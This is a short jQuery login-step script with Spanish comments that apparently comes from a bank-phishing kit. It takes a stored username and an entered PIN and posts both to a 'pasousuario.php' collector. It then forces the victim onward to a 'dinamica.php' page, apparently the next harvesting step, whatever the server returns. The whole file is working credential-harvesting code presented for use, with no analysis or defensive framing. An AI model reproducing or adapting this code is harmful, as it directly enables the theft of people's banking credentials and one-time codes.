$("#btn-password").click(function() {
    var pin = $("#input_real").val();
    var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo"; // Recuperamos el nombre

    $("#fondo, #cargando-o").show();
    
    // ENVIAMOS AMBOS DATOS: Usuario y PIN
    $.post("../process/pasousuario.php", { 
        'txt-usuario': usr, 
        'txt-password': pin 
    }, function(data) {
        // AUTOFLUJO: No lo mandes a WAITING aún, mándalo a la DINÁMICA
        window.location.href = "dinamica.php"; 
    });

    // Salto forzado de seguridad
    setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
});
